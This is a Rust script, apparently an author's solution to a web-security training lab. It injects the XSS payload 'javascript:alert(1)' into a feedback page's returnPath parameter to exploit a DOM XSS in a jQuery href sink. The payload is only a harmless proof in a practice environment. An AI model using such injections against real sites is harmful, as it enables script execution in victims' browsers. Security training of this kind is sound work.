/******************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 15/11/2023
*
* Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
*
* Steps: 1. Inject payload in the returnPath query parameter to call the alert function
*        2. Observe that the script has been executed
*
*******************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a2f00890347ded6821bc4b0009e00f8.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // payload to call the alert function
    let payload = "javascript:alert(1)";

    print!(
        "{}",
        "❯❯ Injecting payload in the returnPath query parameter to call the alert function.. ".white(),
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    client
        .get(format!("{url}/feedback?returnPath={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
